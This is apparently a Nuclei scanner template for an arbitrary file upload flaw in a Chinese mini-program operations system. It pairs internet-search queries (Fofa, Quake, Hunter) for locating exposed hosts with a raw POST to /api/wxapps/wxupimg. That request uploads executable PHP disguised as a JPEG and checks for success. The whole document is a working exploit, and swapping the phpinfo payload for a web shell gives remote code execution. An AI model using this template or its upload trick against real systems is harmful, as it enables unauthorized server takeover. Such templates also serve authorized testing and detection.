id: Industry-wide_wxupimg_Fileupload

info:
  name: Industry-wide_wxupimg_Fileupload
  author: HK
  severity: critical
  description: 全行业小程序运营系统接口Wxapps.php存在任意文件上传漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/com/css/head_foot.css"
    Quake-query: body="/com/css/head_foot.css"
    Hunter-query: body="/com/css/head_foot.css"
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /api/wxapps/wxupimg HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
    Content-Length: 197

    ------WebKitFormBoundary03rNBzFMIytvpWhy
    Content-Disposition: form-data; name="file"; filename="1.php"
    Content-Type: image/jpeg

    <?php phpinfo();?>
    ------WebKitFormBoundary03rNBzFMIytvpWhy--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - upimages
      - .php
      condition: and